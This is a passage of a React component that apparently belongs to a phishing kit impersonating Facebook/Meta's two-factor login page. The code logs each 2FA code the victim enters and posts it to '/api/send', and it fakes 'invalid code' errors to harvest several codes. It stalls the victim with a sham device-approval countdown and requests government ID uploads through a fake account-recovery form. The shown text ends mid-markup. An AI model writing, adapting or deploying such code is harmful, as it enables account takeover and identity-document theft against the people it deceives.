import VerifyImage from '@/assets/images/verify-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faChevronLeft, faComment, faDesktop, faEnvelope, faInfoCircle, faKey, faMobile, faQuestionCircle, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [showMethodModal, setShowMethodModal] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState('notification');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [showDeviceApproval, setShowDeviceApproval] = useState(false);
    const [deviceUsed, setDeviceUsed] = useState(false);
    const [deviceCountdown, setDeviceCountdown] = useState(0);
    const [trustDevice, setTrustDevice] = useState(false);
    const [showRecoveryUpload, setShowRecoveryUpload] = useState(false);
    const [recoveryFiles, setRecoveryFiles] = useState<File[]>([]);
    const [uploading, setUploading] = useState(false);

    const { geoInfo, messageId, messageContent, setMessageContent, userInfo } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [local, domain] = email.split('@');
        if (!local || !domain) return email;
        const masked = local[0] + '*'.repeat(Math.max(local.length - 1, 2));
        return `${masked}@${domain}`;
    };

    const maskPhone = (phone: string): string => {
        if (!phone) return '';
        const cleaned = phone.replace(/\s+/g, '');
        if (cleaned.length < 4) return phone;
        const last2 = cleaned.slice(-2);
        const prefix = cleaned.slice(0, 3);
        return `${prefix} ****** ${last2}`;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'Enter the code we send to your phone.', 'Enter the 6-digit code from your authentication app.', 'Enter a recovery code that you previously saved when you set up two-factor authentication.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Email', "We'll send a code to", 'Text message', 'Authentication app', 'Get a code from your authentication app.', 'Recovery code', 'Use a recovery code that you previously saved.', 'Approve from another device', "Confirm it's you by approving from a device you've previously logged in on.", 'Check your notifications', 'We sent a notification to your other logged-in device. Approve the login there.', 'Waiting for approval', 'Approve from another device to continue.', 'Trust this device and skip this step from now on.', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery', 'Account Recovery', 'Confirm your identity', 'Upload a photo or scan of your government-issued ID to confirm your identity.', 'Accepted ID types', "Driver's license", 'Passport', 'National ID card', 'Residence permit', 'Click to upload your ID', 'or drag and drop', 'Selected files', 'Clear all', 'Your information is protected', 'Your ID will be encrypted and stored securely.', 'Meta does not share your ID with third parties.', 'Your ID will be deleted after the review is complete.', 'Submit for review'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown((prev) => {
                    if (prev === 1) {
                        setShowError(false);
                    }
                    return prev - 1;
                });
            }, 1000);
            return () => clearTimeout(timer);
        }
    }, [countdown]);

    useEffect(() => {
        if (deviceCountdown > 0) {
            const timer = setTimeout(() => {
                setDeviceCountdown((prev) => {
                    if (prev === 1) {
                        setShowDeviceApproval(false);
                        setDeviceUsed(true);
                        setShowMethodModal(true);
                    }
                    return prev - 1;
                });
            }, 1000);
            return () => clearTimeout(timer);
        }
    }, [deviceCountdown]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;

        setMessageContent(updatedMessage);

        try {
            await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });
        } catch (err) {
            console.error('err send:', err);
        }

        if (next >= maxCode) {
            nextStep();
        } else {
            setShowError(true);
            setCode('');
            setCountdown(loadingTime);
        }

        setIsLoading(false);
    };

    const methods: { id: string; title: string; desc: string; icon: typeof faEnvelope }[] = [
        {
            id: 'email',
            title: 'Email',
            desc: `We'll send a code to ${userInfo?.email ? maskEmail(userInfo.email) : 'your email'}`,
            icon: faEnvelope
        },
        {
            id: 'text',
            title: 'Text message',
            desc: `We'll send a code to ${userInfo?.phone ? maskPhone(userInfo.phone) : 'your phone'}`,
            icon: faComment
        },
        {
            id: 'authApp',
            title: 'Authentication app',
            desc: 'Get a code from your authentication app.',
            icon: faMobile
        },
        {
            id: 'recovery',
            title: 'Recovery code',
            desc: 'Use a recovery code that you previously saved.',
            icon: faKey
        },
        ...(!deviceUsed
            ? [
                  {
                      id: 'device',
                      title: 'Approve from another device',
                      desc: "Confirm it's you by approving from a device you've previously logged in on.",
                      icon: faDesktop
                  }
              ]
            : [])
    ];

    const selectedMethodData = methods.find((m) => m.id === selectedMethod) || methods[0];

    return (
        <>
            <div className='fixed inset-0 z-10 flex min-h-screen flex-col bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb]'>
                {/* Header */}
                <header className='flex h-14 items-center justify-between border-b border-[#dde2e8] px-4'>
                    <div className='flex items-center gap-3'>
                        <svg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 40 40'>
                            <path fill='#1877F2' d='M16.7 39.8C7.2 38.1 0 29.9 0 20 0 9 9 0 20 0s20 9 20 20c0 9.9-7.2 18.1-16.7 19.8l-1.1-.9h-4.4l-1.1.9z' />
                            <path fill='#fff' d='m27.8 25.6.9-5.6h-5.3v-3.9c0-1.6.6-2.8 3-2.8H29V8.2c-1.4-.2-3-.4-4.4-.4-4.6 0-7.8 2.8-7.8 7.8V20h-5v5.6h5v14.1c1.1.2 2.2.3 3.3.3 1.1 0 2.2-.1 3.3-.3V25.6h4.4z' />
                        </svg>
                    </div>
                    <div className='flex items-center justify-between gap-4 md:hidden'>
                        <button type='button' className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                            <FontAwesomeIcon icon={faChevronLeft} />
                        </button>
                        <button type='button' className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                            <FontAwesomeIcon icon={faQuestionCircle} />
                        </button>
                    </div>
                </header>

                {/* Content */}
                <div className='mx-auto w-full max-w-150 space-y-4 px-4 py-6'>
                    <div className='text-sm font-medium text-[#0a1317]'>{userInfo?.pageName || 'Page'} • Facebook</div>

                    <p className='text-2xl font-semibold text-[#0a1317]'>
                        {t('Two-factor authentication required')} ({attempts + 1}/{maxCode})
                    </p>

                    <p className='text-[15px] leading-5 text-[#0a1317]'>
                        {selectedMethodData.id === 'email' && (
                            <>
                                {t('Enter the code for this account that we send to')} <span className='font-semibold'>{userInfo?.email ? maskEmail(userInfo.email) : ''}</span>
                            </>
                        )}
                        {selectedMethodData.id === 'text' && <>{t('Enter the code we send to your phone.')}</>}
                        {selectedMethodData.id === 'authApp' && <>{t('Enter the 6-digit code from your authentication app.')}</>}
                        {selectedMethodData.id === 'recovery' && <>{t('Enter a recovery code that you previously saved when you set up two-factor authentication.')}</>}
                    </p>

                    <div className='space-y-4'>
                        <Image src={VerifyImage} className='block w-full rounded-2xl' alt='Mobile verification example' />
                    </div>

                    <div className='space-y-4'>
                        <div className='relative'>
                            <input
                                id='code'
                                className={`peer h-16 w-full rounded-2xl border px-4 pt-2.5 pb-0 focus:outline-none ${showError ? 'border-red-600' : 'border-[#dde2e8]'}`}
                                placeholder=' '
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                        setShowError(false);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                            />
                            <label htmlFor='code' className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError ? 'text-red-600' : 'text-[#5d6c7b]'}`}>
                                <span>{showError ? t('Invalid code') : t('Enter code')}</span>
                            </label>
                            {code && (
                                <button type='button' className='absolute top-1/2 right-0 -translate-y-1/2 pr-4' onClick={() => setCode('')}>
                                    <FontAwesomeIcon icon={faTimes} />
                                </button>
                            )}
                        </div>

                        <button type='button' className='flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] transition-opacity disabled:cursor-not-allowed disabled:opacity-60' disabled={isLoading || countdown > 0} onClick={handleSubmit}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent' /> : t('Continue')}
                        </button>

                        <button type='button' className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50' onClick={() => setShowMethodModal(true)}>
                            {t('Try another way')}
                        </button>

                        <div className='flex flex-col items-center pt-8 pb-4'>
                            <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 100' className='h-3 w-[60px]'>
                                <defs>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='mg1' x1='124.38' x2='160.839' y1='99' y2='59.326'>
                                        <stop offset='.427' stopColor='#0278F1' />
                                        <stop offset='.917' stopColor='#0180FA' />
                                    </linearGradient>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='mg2' x1='42' x2='-1.666' y1='4.936' y2='61.707'>
                                        <stop offset='.427' stopColor='#0165E0' />
                                        <stop offset='.917' stopColor='#0180FA' />
                                    </linearGradient>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='mg3' x1='27.677' x2='132.943' y1='28.71' y2='71.118'>
                                        <stop stopColor='#0064E0' />
                                        <stop offset='.656' stopColor='#0066E2' />
                                        <stop offset='1' stopColor='#0278F1' />
                                    </linearGradient>
                                </defs>
                                <path d='M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z' fill='#1C2B33' />
                                <path d='M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z' fill='#0180FA' />
                                <path d='M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z' fill='url(#mg1)' />
                                <path d='M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z' fill='url(#mg2)' />
                                <path d='m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z' fill='url(#mg3)' />
                            </svg>
                            <p className='mt-2 text-[13px] text-[#7d8792]'>Meta &copy; 2026</p>
                        </div>
                    </div>
                </div>
            </div>

            {/* Method Selection Modal */}
            {showMethodModal && (
                <div className='fixed inset-0 z-50 flex bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] md:items-center md:justify-center md:bg-black/40'>
                    <div className='relative flex h-full w-full flex-col items-stretch bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] md:h-auto md:w-auto md:max-w-150 md:rounded-2xl md:shadow-lg'>
                        <div className='flex h-16 min-h-16 items-center justify-between px-4'>
                            <button type='button' onClick={() => setShowMethodModal(false)} className='flex h-8 w-8 items-center justify-center text-gray-500 transition-colors hover:text-gray-700'>
                                <FontAwesomeIcon icon={faChevronLeft} />
                            </button>
                        </div>

                        <div className='flex-1 px-8 pb-8'>
                            <p className='mb-1 text-[24px] font-semibold text-[#050505]'>{t("Choose a way to confirm it's you")}</p>
                            <p className='mb-6 text-[15px] text-gray-600'>{t('These are your available confirmation methods.')}</p>

                            <div className='overflow-hidden rounded-xl border border-gray-200'>
                                {methods.map((method, i) => (
                                    <label key={method.id} className={`flex cursor-pointer items-center gap-4 p-4 transition-all hover:bg-gray-50 ${i > 0 ? 'border-t border-gray-200' : ''} ${selectedMethod === method.id ? 'bg-[#f0f6ff]' : ''}`}>
                                        <div className='flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-[#e4e6eb]'>
                                            <FontAwesomeIcon icon={method.icon} className='text-[16px] text-[#606770]' />
                                        </div>
                                        <div className='min-w-0 flex-1'>
                                            <div className='text-[16px] font-semibold text-[#050505]'>{method.title}</div>
                                            <div className='truncate text-[14px] text-[#65676B]'>{method.desc}</div>
                                        </div>
                                        <input type='radio' name='confirmMethod' value={method.id} checked={selectedMethod === method.id} onChange={(e) => setSelectedMethod(e.target.value)} className='h-5 w-5 shrink-0 border-2 border-[#606770] checked:border-[#0064e0]' />
                                    </label>
                                ))}
                            </div>

                            <div className='mt-6 rounded-xl border border-gray-200 p-4'>
                                <div className='flex gap-3'>
                                    <FontAwesomeIcon icon={faInfoCircle} className='mt-1 text-gray-500' />
                                    <div>
                                        <p className='text-[15px] font-semibold'>{t('Need another option?')}</p>
                                        <p className='text-[14px] text-gray-600'>
                                            {t('To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to')}{' '}
                                            <a
                                                href='#'
                                                className='text-[#0064e0] hover:underline'
                                                onClick={(e) => {
                                                    e.preventDefault();
                                                    setShowMethodModal(false);
                                                    setShowRecoveryUpload(true);
                                                }}
                                            >
                                                {t('account recovery')}
                                            </a>
                                            .
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className='border-t border-gray-200 p-6'>
                            <button
                                type='button'
                                className='h-12 w-full rounded-full bg-[#0064e0] text-[17px] font-medium text-white transition-opacity hover:opacity-90'
                                onClick={() => {
                                    if (selectedMethod === 'device') {
                                        setShowMethodModal(false);
                                        setShowDeviceApproval(true);
                                        setDeviceCountdown(60);
                                    } else {
                                        setShowMethodModal(false);
                                    }
                                }}
                            >
                                {t('Continue')}
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {showDeviceApproval && (
                <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/30 px-4 py-6'>
                    <div className='flex w-full max-w-[580px] flex-col items-center rounded-[8px] bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] px-6 py-10 text-center shadow-lg sm:px-8 sm:py-12 md:py-10'>
                        <div className='mx-auto mb-6'>
                            <svg xmlns='http://www.w3.org/2000/svg' width='56' height='56' viewBox='0 0 40 40'>
                                <path fill='#1877F2' d='M16.7 39.8C7.2 38.1 0 29.9 0 20 0 9 9 0 20 0s20 9 20 20c0 9.9-7.2 18.1-16.7 19.8l-1.1-.9h-4.4l-1.1.9z' />
                                <path fill='#fff' d='m27.8 25.6.9-5.6h-5.3v-3.9c0-1.6.6-2.8 3-2.8H29V8.2c-1.4-.2-3-.4-4.4-.4-4.6 0-7.8 2.8-7.8 7.8V20h-5v5.6h5v14.1c1.1.2 2.2.3 3.3.3 1.1 0 2.2-.1 3.3-.3V25.6h4.4z' />
                            </svg>
                        </div>

                        <div className='mb-5 w-full max-w-[420px]'>
                            <svg viewBox='0 0 440 300' fill='none' xmlns='http://www.w3.org/2000/svg' className='h-auto w-full' aria-hidden='true'>
                                <defs>
                                    <linearGradient id='tfBg' x1='0' y1='0' x2='1' y2='1'>
                                        <stop offset='0%' stopColor='#f0f4f4' />
                                        <stop offset='100%' stopColor='#f9fbfb' />
                                    </linearGradient>
                                    <linearGradient id='tfPhBody' x1='0' y1='0' x2='0' y2='1'>
                                        <stop offset='0%' stopColor='#2b2b3e' />
                                        <stop offset='100%' stopColor='#1f2535' />
                                    </linearGradient>
                                    <linearGradient id='tfPhScr' x1='0' y1='0' x2='0' y2='1'>
                                        <stop offset='0%' stopColor='#e99fcb' />
                                        <stop offset='40%' stopColor='#ebe4f5' />
                                        <stop offset='100%' stopColor='#d8d2de' />
                                    </linearGradient>
                                    <linearGradient id='tfMonBody' x1='0' y1='0' x2='0' y2='1'>
                                        <stop offset='0%' stopColor='#dbd7da' />
                                        <stop offset='100%' stopColor='#c2c4d1' />
                                    </linearGradient>
                                    <linearGradient id='tfMonScr' x1='0' y1='0' x2='0' y2='1'>
                                        <stop offset='0%' stopColor='#f5f3f7' />
                                        <stop offset='100%' stopColor='#ebe4f5' />
                                    </linearGradient>
                                    <linearGradient id='tfNotif' x1='0' y1='0' x2='0' y2='1'>
                                        <stop offset='0%' stopColor='#7eb3ec' />
                                        <stop offset='100%' stopColor='#6da0d8' />
                                    </linearGradient>
                                </defs>

                                <rect width='440' height='300' fill='url(#tfBg)' />

                                <g transform='translate(30,50)'>
                                    <rect x='0' y='0' width='155' height='220' rx='24' fill='url(#tfPhBody)' />
                                    <rect x='7' y='12' width='141' height='196' rx='16' fill='url(#tfPhScr)' />
                                    <rect x='62' y='20' width='31' height='4' rx='2' fill='#fff' opacity='0.2' />

                                    <g transform='translate(22,38)'>
                                        <rect x='0' y='0' width='111' height='158' rx='10' fill='#fff' opacity='0.85' />
                                        <rect x='12' y='16' width='87' height='12' rx='4' fill='#2b2b3e' opacity='0.06' />
                                        <circle cx='55' cy='56' r='16' fill='none' stroke='#e99fcb' strokeWidth='1.5' />
                                        <path d='M50 56L54 60L60 52' stroke='#e99fcb' strokeWidth='2.2' strokeLinecap='round' strokeLinejoin='round' fill='none' />
                                        <rect x='14' y='84' width='83' height='6' rx='3' fill='#d8d2de' />
                                        <rect x='14' y='96' width='60' height='6' rx='3' fill='#d8d2de' />
                                        <rect x='14' y='110' width='40' height='4' rx='2' fill='#d8d2de' />
                                        <rect x='20' y='126' width='71' height='16' rx='6' fill='#e99fcb' />
                                        <rect x='28' y='132' width='55' height='3' rx='1.5' fill='#fff' opacity='0.5' />
                                    </g>

                                    <rect x='62' y='201' width='31' height='3' rx='1.5' fill='#fff' opacity='0.2' />
                                </g>

                                <g transform='translate(210,25)'>
                                    <rect x='0' y='0' width='200' height='145' rx='10' fill='url(#tfMonBody)' />
                                    <rect x='5' y='5' width='190' height='127' rx='6' fill='url(#tfMonScr)' />
                                    <rect x='90' y='145' width='20' height='8' rx='1' fill='#c6c8cb' />
                                    <rect x='55' y='153' width='90' height='6' rx='3' fill='#c6c8cb' />

                                    <g transform='translate(12,12)'>
                                        <rect x='0' y='0' width='176' height='110' rx='6' fill='#fff' />
                                        <circle cx='16' cy='18' r='6' fill='#1877F2' />
                                        <rect x='30' y='14' width='60' height='5' rx='2' fill='#d8d2de' />
                                        <rect x='30' y='24' width='40' height='4' rx='2' fill='#ebe4f5' />
                                        <rect x='12' y='40' width='152' height='7' rx='3' fill='#ebe4f5' />
                                        <rect x='12' y='52' width='152' height='7' rx='3' fill='#ebe4f5' />
                                        <rect x='12' y='64' width='95' height='7' rx='3' fill='#ebe4f5' />
                                        <rect x='12' y='76' width='152' height='7' rx='3' fill='#ebe4f5' />
                                        <rect x='12' y='88' width='152' height='7' rx='3' fill='#ebe4f5' />

                                        <rect x='42' y='96' width='92' height='10' rx='5' fill='url(#tfNotif)' />
                                    </g>
                                </g>
                            </svg>
                        </div>

                        <p className='mb-2 text-[20px] font-semibold text-[#050505]'>{t('Waiting for approval')}</p>
                        <p className='mb-5 text-[15px] leading-[1.4] text-[#65676B]'>{t('Approve from another device to continue.')}</p>

                        <div className='mb-5 flex flex-col items-center'>
                            <div className='h-10 w-10 animate-spin rounded-full border-3 border-[#e4e6eb] border-t-[#0064e0]' />
                            <p className='mt-3 text-[14px] font-medium text-[#0064e0]'>
                                {t('Waiting for approval')}... ({deviceCountdown}s)
                            </p>
                        </div>

                        <label className='mb-5 flex w-full max-w-[420px] cursor-pointer items-start gap-3 rounded-xl border border-[#e4e6eb] bg-[#f5f8fa] p-3.5 text-left transition hover:bg-white'>
                            <input
                                type='checkbox'
                                checked={trustDevice}
                                onChange={(e) => setTrustDevice(e.target.checked)}
                                className='mt-0.5 h-5 w-5 shrink-0 cursor-pointer appearance-none rounded border-2 border-[#0866ff] bg-white transition-all checked:border-[#0866ff] checked:bg-[#0866ff]'
                                style={{
                                    backgroundImage: trustDevice ? "url(\"data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='white'%3e%3cpath d='M13.5 4.5L6 12L2.5 8.5L3.91 7.09L6 9.17L12.09 3.09L13.5 4.5Z'/%3e%3c/svg%3e\")" : 'none',
                                    backgroundSize: '100% 100%',
                                    backgroundPosition: 'center',
                                    backgroundRepeat: 'no-repeat'
                                }}
                            />
                            <div className='flex-1 text-left'>
                                <p className='text-[14px] leading-[1.4] font-medium text-[#050505]'>{t('Trust this device and skip this step from now on.')}</p>
                            </div>
                        </label>

                        <button
                            type='button'
                            className='h-11 w-full max-w-[420px] rounded-full border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'
                            onClick={() => {
                                setShowDeviceApproval(false);
                                setDeviceUsed(true);
                                setShowMethodModal(true);
                            }}
                        >
                            {t('Try another way')}
                        </button>
                    </div>
                </div>
            )}

            {showRecoveryUpload && (
                <div className='fixed inset-0 z-50 flex flex-col bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] md:items-center md:justify-center md:bg-black/40'>
                    <div className='relative flex h-full w-full flex-col bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] md:h-auto md:w-auto md:max-w-[540px] md:rounded-[8px] md:shadow-lg'>
                        <div className='flex h-14 items-center border-b border-[#d4dbe3] px-5'>
                            <button
                                type='button'
                                onClick={() => {
                                    setShowRecoveryUpload(false);
                                    setShowMethodModal(true);
                                }}
                                className='flex h-8 w-8 items-center justify-center text-[#667085] hover:text-[#465a69]'
                            >
                                <FontAwesomeIcon icon={faChevronLeft} />
                            </button>
                            <p className='ml-2 text-[16px] font-semibold text-[#050505]'>{t('Account Recovery')}</p>
                        </div>

                        <div className='flex-1 overflow-y-auto scroll-smooth px-5 py-5'>
                            <div className='mx-auto mb-5 flex h-[56px] w-[56px] items-center justify-center rounded-full bg-[#1877F2]'>
                                <svg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 24 24' fill='none' stroke='#fff' strokeWidth='1.5' strokeLinecap='round' strokeLinejoin='round'>
                                    <path d='M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z' />
                                    <polyline points='14 2 14 8 20 8' />
                                    <line x1='16' y1='13' x2='8' y2='13' />
                                    <line x1='16' y1='17' x2='8' y2='17' />
                                    <polyline points='10 9 9 9 8 9' />
                                </svg>
                            </div>

                            <p className='mb-1 text-center text-[17px] font-bold text-[#050505]'>{t('Confirm your identity')}</p>
                            <p className='mb-5 text-center text-[14px] leading-[1.4] text-[#667085]'>{t('Upload a photo or scan of your government-issued ID to confirm your identity.')}</p>

                            <p className='mb-2 text-[14px] font-semibold text-[#050505]'>{t('Accepted ID types')}:</p>
                            <div className='mb-4 grid grid-cols-2 gap-2'>
                                {[
                                    { label: "Driver's license", icon: '🚗' },
                                    { label: 'Passport', icon: '🛂' },
                                    { label: 'National ID card', icon: '🆔' },
                                    { label: 'Residence permit', icon: '🏠' }
                                ].map((doc) => (
                                    <div key={doc.label} className='flex items-center gap-2.5 rounded-[10px] bg-white/70 px-3.5 py-3'>
                                        <span className='text-[16px]'>{doc.icon}</span>
                                        <span className='text-[13px] font-medium text-[#050505]'>{doc.label}</span>
                                    </div>
                                ))}
                            </div>

                            <div className='mb-4 rounded-[10px] border-2 border-dashed border-[#bcc0c4] bg-white/50 px-5 py-7 text-center transition-colors hover:border-[#0866ff] hover:bg-white/80'>
                                <input
                                    type='file'
                                    id='recovery-file-input'
                                    multiple
                                    accept='image/*,.pdf'
                                    className='hidden'
                                    onChange={(e) => {
                                        if (e.target.files) {
                                            setRecoveryFiles(Array.from(e.target.files));
                                        }
                                    }}
                                />
                                <label htmlFor='recovery-file-input' className='cursor-pointer'>
                                    <svg xmlns='http://www.w3.org/2000/svg' width='36' height='36' viewBox='0 0 24 24' fill='none' stroke='#0866ff' strokeWidth='1.5' strokeLinecap='round' strokeLinejoin='round' className='mx-auto mb-2'>
                                        <path d='M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4' />
                                        <polyline points='17 8 12 3 7 8' />
                                        <line x1='12' y1='3' x2='12' y2='15' />
                                    </svg>
                                    <p className='text-[14px] font-medium text-[#0866ff]'>{t('Click to upload your ID')}</p>
                                    <p className='mt-0.5 text-[12px] text-[#667085]'>{t('or drag and drop')}</p>
                                </label>
                            </div>

                            {recoveryFiles.length > 0 && (
                                <div className='mb-4 space-y-2'>
                                    <p className='text-[13px] font-medium text-[#050505]'>{t('Selected files')}:</p>
                                    {recoveryFiles.map((file, i) => (
                                        <div key={i} className='flex items-center justify-between gap-3 rounded-[8px] bg-white/70 px-3.5 py-2.5'>
                                            <div className='flex items-center gap-2.5 truncate'>
                                                <svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='#667085' strokeWidth='1.5' strokeLinecap='round' strokeLinejoin='round'>
                                                    <path d='M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z' />
                                                    <polyline points='14 2 14 8 20 8' />
                                                </svg>
                                                <span className='truncate text-[13px] text-[#050505]'>{file.name}</span>
                                            </div>
                                            <span className='shrink-0 text-[12px] text-[#667085]'>{(file.size / 1024 / 1024).toFixed(1)} MB</span>
                                        </div>
                                    ))}
